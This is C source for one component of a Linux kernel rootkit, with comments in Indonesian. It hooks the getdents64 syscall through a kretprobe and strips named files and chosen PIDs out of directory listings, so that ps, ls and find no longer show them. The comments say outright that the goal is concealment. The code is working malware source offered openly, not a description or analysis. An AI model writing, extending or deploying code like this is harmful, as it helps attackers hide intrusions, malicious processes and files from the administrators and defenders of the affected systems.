/*
 * hook_getdents.c — filter hasil readdir (kretprobe getdents64).
 *
 * Mekanisme (ini JANTUNG penyembunyian file & proses):
 *   ps / ls / find semuanya membaca daftar lewat syscall getdents64.
 *   Kita pasang kretprobe SETELAH syscall selesai:
 *     - seluruh hasil (buffer user) disalin ke memori kernel
 *   - entri yang namanya cocok daftar hide BUANG (memmove)
 *     - buffer dikirim balik + nilai balik dikurangi
 *   -> pemanggil tidak pernah melihat entri itu, padahal filenya/PID-nya
 *      tetap hidup dan tetap bisa diakses lewat PATH LANGSUNG.
 *
 * Target arsitektur: x86_64 (argumen syscall: di, si, dx -> regs->si = buf)
 */
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/ctype.h>
#include <linux/stddef.h>
#include "rkit.h"

/* layout persis struct linux_dirent64 (uapi) — packed untuk hindari
 * asumsi padding; aman di x86_64 (unaligned load didukung) */
struct __attribute__((packed)) rk_dirent64 {
	u64               d_ino;
	u64               d_off;
	unsigned short    d_reclen;
	unsigned char     d_type;
	char              d_name[];
};

#define NAME_OFF  offsetof(struct rk_dirent64, d_name)   /* =19 */

struct gd_save {
	char __user *user_buf;
};

static struct kretprobe rp_gd;

/* apakah nama entri ini harus disembunyikan? */
static bool name_blocked(const char *n, unsigned int max)
{
	unsigned int i, l;

	if (!n || !max)
		return false;
	l = strnlen(n, max);
	if (!l)
		return false;

	/*1) kecocokan nama persis (hide file by NAMA — fitur unggulan
	 *    dibanding bds yang prefix-only). Lewat API core.c */
	if (rk_is_hidden_name(n))
		return true;

	/*2) entri berupa angka penuh -> kandidat PID di /proc */
	for (i = 0; i < l; i++)
		if (!isdigit(n[i]))
			return false;
	return rk_is_hidden_pid(n);
}

static int gd_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct gd_save *s = (struct gd_save *)ri->data;

	s->user_buf = (char __user *)regs->si;   /* arg2 syscall (x86_64) */
	return 0;
}

static int gd_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct gd_save *s = (struct gd_save *)ri->data;
	long ret = regs_return_value(regs);
	unsigned long pos = 0, out = 0;
	char *kb;

	if (ret <= 0 || ret > (1L << 24))   /* batas wajar (~16MB) */
		return 0;

	kb = kmalloc((size_t)ret, GFP_KERNEL);
	if (!kb)
		return 0;
	if (copy_from_user(kb, s->user_buf, (unsigned long)ret)) {
		kfree(kb);
		return 0;
	}

	/* kompakkan: entri lolos disalin berurutan, entri terblok dilewati */
	while (pos + NAME_OFF < (unsigned long)ret) {
		struct rk_dirent64 *d = (void *)(kb + pos);
		unsigned int reclen = d->d_reclen;

		if (reclen < NAME_OFF + 1 || pos + reclen > (unsigned long)ret)
			break;                      /* buffer tidak konsisten */

		if (!name_blocked(d->d_name, reclen - NAME_OFF)) {
			if (out != pos)
				memmove(kb + out, d, reclen);
			out += reclen;
		}
		pos += reclen;
	}

	if (out != (unsigned long)ret) {
		/* kirim hasil tersaring kembali ke buffer user;
		 * kalau copy gagal, JANGAN ubah nilai balik (konsistensi) */
		if (copy_to_user(s->user_buf, kb, out) == 0)
			regs->ax = out;      /* ubah retval syscall — x86_64 */
	}

	kfree(kb);
	return 0;
}

int rk_getdents_init(void)
{
	int ret;

	memset(&rp_gd, 0, sizeof(rp_gd));
	rp_gd.kp.symbol_name   = "__x64_sys_getdents64";
	rp_gd.handler          = gd_handler;
	rp_gd.entry_handler    = gd_entry;
	rp_gd.data_size        = sizeof(struct gd_save);
	rp_gd.maxactive        = 32;      /* maksimal32 pemanggil bersamaan */

	ret = register_kretprobe(&rp_gd);
	if (ret)
		pr_err("rkit: getdents64 kretprobe gagal (%d) — symbol salah?\n", ret);
	else
		pr_info("rkit: hook getdents64 aktif\n");
	return ret;
}

void rk_getdents_exit(void)
{
	unregister_kretprobe(&rp_gd);
}
